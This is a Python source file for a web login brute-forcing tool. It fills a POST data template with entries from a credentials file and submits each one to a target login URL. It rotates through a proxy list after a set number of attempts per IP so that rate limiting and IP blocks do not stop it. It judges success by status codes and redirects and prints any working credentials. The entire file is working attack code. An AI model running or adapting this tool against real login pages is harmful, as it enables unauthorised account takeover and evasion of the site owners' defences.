import argparse
import sys, json, os, re
import logging
from packages.logger import Logger
from packages.utils import (
    collect_input_args,
    validate_input_args,
)
import urllib.request, urllib.error, urllib.response, urllib.parse
from packages.config import *
from BruteforcerHTTPRedirectHandler import BruteforcerHTTPRedirectHandler


class Bruteforcer:
    def __init__(
        self,
        url,
        headers_file_raw,
        data_scheme_file_raw,
        credentials_file_raw,
        fail_url_pattern,
        proxies_file_raw,
        attemps_per_ip,
    ) -> None:
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.debug("Logger created correctly")
        parse_url = urllib.parse.urlparse(url)
        self.host = "{uri.scheme}://{uri.netloc}/".format(uri=parse_url)
        self.logger.debug(f"Parsing URL `{self.host}` started")
        with urllib.request.urlopen(self.host) as response:
            if response.code in [200, 201]:
                self.url = url
                self.logger.debug(f"Parsing URL `{self.host}` finished correctly")
        self.fail_url = fail_url_pattern
        self.headers = {}
        if headers_file_raw:
            self.logger.debug(f"Parsing file `{headers_file_raw}` started")
            self.set_headers(headers_file_raw)
            self.logger.debug(f"Parsing file `{headers_file_raw}` finished correctly")
        if data_scheme_file_raw:
            self.logger.debug(f"Parsing file `{data_scheme_file_raw}` started")
            self.set_data_scheme(data_scheme_file_raw)
            self.logger.debug(
                f"Parsing file `{data_scheme_file_raw}` finished correctly"
            )
        if credentials_file_raw:
            self.logger.debug(f"Parsing file `{credentials_file_raw}` started")
            credentials_list = self.__open_credentials_file__(credentials_file_raw)
            self.logger.debug(
                f"Parsing file `{credentials_file_raw}` finished correctly"
            )
        self.logger.debug(
            f"Credentials and POST injection data scheme validation started"
        )
        (
            self.variables_to_injection,
            self.credentials_list,
        ) = self.__validate_credentials_file__(
            self.data_scheme, credentials_list, data_scheme_file_raw
        )
        self.logger.debug(
            f"Credentials and POST injection data scheme validation finished correctly"
        )
        self.attemps_per_ip = attemps_per_ip
        self.proxies = []
        if proxies_file_raw:
            self.logger.debug(f"Parsing file `{proxies_file_raw}` finished correctly")
            self.set_proxies(proxies_file_raw)
            self.logger.debug(f"Parsing file `{proxies_file_raw}` finished correctly")

    def __is_file_empty__(self, input_file, file_name):
        if not input_file:
            self.logger.info(f"File: `{file_name}` is empty! Adios!")
            return True
        return False

    def __validate_credentials_file__(
        self, data_scheme, credentials_file, data_scheme_file_raw
    ):
        # jeżeli zmienna jest duplikowana to i tak zmieniane są wszystkie na raz
        variables_to_injection = list(
            dict.fromkeys(re.findall("\$\{[a-zA-Z]+}", data_scheme))  # config
        )
        len_variables_to_injection = len(variables_to_injection)
        self.logger.debug(
            f"{len_variables_to_injection} variables `{variables_to_injection}` found in `{data_scheme_file_raw}`"
        )
        credentials = []
        fields_cnt = credentials_file[0].count(":") + 1
        if fields_cnt > len_variables_to_injection:
            self.logger.info(
                f"In credentials file is `{fields_cnt}` fields, and it's more than is needed in API data scheme (`{len_variables_to_injection}`)! I'll only use the first `{len_variables_to_injection}` columns from the credentials file"
            )
        for line in credentials_file:
            # pomija puste linijki
            line = line.rstrip()
            if line.strip():
                current_fields_cnt = line.count(":") + 1
                self.logger.debug(
                    f"Fields in line `{line}`credentials file: `{current_fields_cnt}`, Variables in your data to injection file: {len(variables_to_injection)}"
                )
                if current_fields_cnt == 0:
                    continue
                elif current_fields_cnt != fields_cnt:
                    self.logger.info(
                        f"Line `{line.rstrip()}` differs than other lines in credentials file"
                    )
                    sys.exit(-1)
                elif current_fields_cnt >= len_variables_to_injection:
                    credentials.append(
                        tuple(line.split(":")[i] for i in range(fields_cnt))
                    )
                else:
                    self.logger.error(
                        "Match the number of columns in credential file to the number of variables in the text file with API data scheme"
                    )
                    sys.exit(-1)
            else:
                # warning
                self.logger.warning("An empty line in credentials file. Skipped!")
        return variables_to_injection, credentials

    def set_headers(self, headers_file_raw):
        def ask_for_continue():
            keyboard_input = input(
                "Would you like to attack with POST data without your headers? Y or N?"
            )
            if keyboard_input.lower() in ["y", "yes", "yeah", ""]:
                return True
            return False

        self.headers = {}
        try:
            with open(headers_file_raw) as headers_file:
                if ".json" in headers_file_raw:
                    self.headers = json.load(headers_file)
                    return
                else:
                    headers_list_raw = list(headers_file.readlines())
        except json.decoder.JSONDecodeError as e:
            self.logger.error(f"Error in headers file `{headers_file_raw}`: `{e}`")
            if not ask_for_continue():
                self.logger.info("Bye!")
                sys.exit(-1)
        except FileNotFoundError as e:
            self.logger.error(f"Exception in headers file `{headers_file_raw}`: `{e}`")
            if not ask_for_continue():
                self.logger.info("Bye!")
                sys.exit(-1)
        else:
            headers_list_raw_len = len(headers_list_raw)
            current_separator = ""
            for separator in [": ", ",", ";", "; "]:  # to config
                if (
                    len([header for header in headers_list_raw if separator in header])
                    == headers_list_raw_len
                ):
                    current_separator = separator
                    break
            if not current_separator:
                self.logger.warning(
                    f"Unknown separator in `{headers_file_raw}`! Please give me correct headers file"
                )
                if not ask_for_continue():
                    self.logger.info("Bye!")
                    sys.exit(-1)
                return
            for header in headers_list_raw:
                header = str(header).replace('"', "").replace("'", "")
                self.headers[header.split(current_separator)[0]] = header.split(
                    current_separator
                )[1].strip()
        return

    def set_data_scheme(self, data_scheme_file_raw):
        with open(data_scheme_file_raw, "r") as data_scheme_file:
            self.data_scheme = data_scheme_file.read().rstrip()
            if self.__is_file_empty__(self.data_scheme, data_scheme_file_raw):
                sys.exit(-1)
        #

    def __open_credentials_file__(self, credentials_file_raw):
        with open(credentials_file_raw) as credentials_file:
            credentials_list = credentials_file.readlines()
            if self.__is_file_empty__(credentials_list, credentials_file_raw):
                sys.exit(-1)
            return credentials_list

    def __ask_for_continue_without_proxy__(self):
        keyboard_input = input(
            "Would You like to continue bruteforce without proxy? Y or N?"
        )
        if keyboard_input.lower() in ["y", "yes", "yeah", ""]:
            self.logger.warn("I'll continue with your IP")
            return True
        return False

    def set_proxies(self, proxies_file_raw):
        try:
            with open(proxies_file_raw) as proxies_file:
                self.proxies = [line.rstrip() for line in proxies_file if line.strip()]
                if not self.proxies:
                    raise ValueError(f"{proxies_file_raw} is empty")
        except FileNotFoundError as e:
            self.logger.warning(
                f"Exception in proxies file `{proxies_file_raw}`: `{e}`"
            )
            if not self.__ask_for_continue_without_proxy__():
                self.logger.info("Bye!")
                sys.exit(0)
            return
        except ValueError as e:
            self.logger.warning(f"Exception: `{e}`")
        else:
            if self.attemps_per_ip * len(self.proxies) < len(self.credentials_list):
                self.logger.warning(
                    f"There is too much credentials to check for (`{len(self.credentials_list)}`) for `{self.attemps_per_ip}` trials per `{len(self.proxies)}` IP addresses. Rest of the attemps will be performed with last IP in list `{self.proxies[len(self.proxies)-1]}`"
                )
                while self.attemps_per_ip * len(self.proxies) < len(
                    self.credentials_list
                ):
                    self.proxies.insert(
                        len(self.proxies), self.proxies[len(self.proxies) - 1]
                    )

    def __add_headers__(self, opener):
        if self.headers:
            for key, value in self.headers.items():
                opener.addheaders = [(key, value)]
        else:
            opener.addheaders = [("Referer", self.host)]
        return opener

    def perform_bruteforce(self):
        def control_the_proxy_rotation(index, data_to_post):
            try:
                index = self.proxy_rotating_injection(index, str.encode(data_to_post))
            except urllib.error.HTTPError as HTTPe:
                # self.logger.debug(HTTPe.code)
                if HTTPe.reason in [
                    "Bad Request",
                    "Unauthorized",
                    "Unprocessable Entity",
                ]:
                    self.logger.info("[-] Incorrect credentials [-]")
                else:
                    self.logger.warning(f"Exception: {HTTPe}")
            except urllib.error.URLError as URLe:
                self.logger.warning(
                    f"Exception: `{URLe}`! I'll try it with another IP from list"
                )
                self.proxies = [i for i in self.proxies if i != self.proxies[index]]
                if self.proxies:
                    old_size_proxy_list = len(self.proxies) - 1
                    self.logger.debug(f"INDEX {index}, SIZE {old_size_proxy_list}")
                    if index < old_size_proxy_list:
                        index = index + 1
                    else:
                        index = 0
                    # recursion
                    index = control_the_proxy_rotation(index, data_to_post)
                else:
                    if not self.__ask_for_continue_without_proxy__():
                        self.logger.info("Bye!")
                        sys.exit(0)
                    self.standard_injection(str.encode(data_to_post))
            return index

        counter = 0
        index = 0
        for credentials in self.credentials_list:
            data_to_post = self.data_scheme
            for i in range(len(self.variables_to_injection)):
                data_to_post = data_to_post.replace(
                    self.variables_to_injection[i], credentials[i]
                )
            if self.proxies:
                index = control_the_proxy_rotation(index, data_to_post)
                if counter < self.attemps_per_ip:
                    counter = counter + 1
                else:
                    # zmiana indexu IP do bruteforce
                    if index != len(self.proxies) - 1:
                        index = index + 1
                    else:
                        index = 0
                    counter = 0
            else:
                try:
                    self.standard_injection(str.encode(data_to_post))
                except urllib.error.HTTPError as HTTPe:
                    if HTTPe.reason in [
                        "Bad Request",
                        "Unauthorized",
                        "Unprocessable Entity",
                    ]:
                        self.logger.isEnabledFor("[-] Incorrect credentials [-]")
                    else:
                        self.logger.warning(f"Exception: {HTTPe}")
                except urllib.error.URLError as URLe:
                    self.logger.warning(f"Exception: `{URLe}`")
        return

    def proxy_rotating_injection(self, index, data_bytes):
        self.logger.info(f"IP: `{self.proxies[index]}`, Data: `{data_bytes}`")
        redirect_handler = BruteforcerHTTPRedirectHandler()
        proxy_handler = urllib.request.ProxyHandler(
            {"http": self.proxies[index], "https": self.proxies[index]}
        )
        opener = urllib.request.build_opener(proxy_handler, redirect_handler)
        opener = self.__add_headers__(opener)
        urllib.request.install_opener(opener)
        request = urllib.request.Request(self.url, data=data_bytes)
        with urllib.request.urlopen(request, timeout=10) as response:
            if self.verify_an_autorization(redirect_handler, response):
                current_credentials = data_bytes.decode("utf-8")
                self.logger.info(f"[+] CORRECT CREDENTIALS `{current_credentials}` [+]")
                sys.exit(0)
            else:
                self.logger.info("[-] Incorrect credentials [-]")
        return index

    def standard_injection(self, data_bytes):
        self.logger.info(f"IP: Your IP, Data: `{data_bytes}`")
        redirect_handler = BruteforcerHTTPRedirectHandler()
        opener = urllib.request.build_opener(redirect_handler)
        opener = self.__add_headers__(opener)
        urllib.request.install_opener(opener)
        request = urllib.request.Request(self.url, data=data_bytes)
        with urllib.request.urlopen(request, timeout=10) as response:
            if self.verify_an_autorization(redirect_handler, response):
                current_credentials = data_bytes.decode("utf-8")
                self.logger.debug("Correct credentials found")
                self.logger.info(f"[+] CORRECT CREDENTIALS `{current_credentials}` [+]")
                self.logger.debug("Work is done! Adios!")
                sys.exit(0)
            else:
                self.logger.info("[-] Incorrect credentials [-]")
        return

    def verify_an_autorization(self, redirect_handler, response):
        self.logger.debug(f"Response status: `{response.status}`")
        redirects = redirect_handler.get_redirects()
        self.logger.debug(f"Collected redirects after trying to login: `{redirects}`")
        is_fail_url_match = True
        if redirects and self.fail_url:
            is_fail_url_match = (
                len([url for url in redirects if self.fail_url in url]) > 0
            )
        elif redirects and not self.fail_url:
            is_fail_url_match = True  # ewidentnue
        elif not redirects:
            is_fail_url_match = False
        if response.code in [200, 201] and not is_fail_url_match:
            return True
        return False


def main(args):
    bruteforce_tool = Bruteforcer(
        args.url,
        args.headers,
        args.data_scheme,
        args.credentials_file,
        args.fail_url,
        args.proxies,
        args.attemps_per_ip,
    )
    bruteforce_tool.perform_bruteforce()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    args = collect_input_args(parser)
    validate_input_args(args)
    LOGGING_STD = True if os.getenv("LOGGING_STD", "true").lower() == "true" else False
    LOGGING_LEVEL = logging.DEBUG if args.verbose > 0 else logging.INFO
    logger = (
        Logger()
        .Init(
            loggerType="std",
            loggerInit=LOGGING_STD,
            level=LOGGING_LEVEL,
            formatterName="formater",
        )
        .Get()
    )
    try:
        main(args)
    except KeyboardInterrupt:
        logger.warning("Interrupted")
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
    except Exception as e:
        logger.error(f"Exception `{e}`")
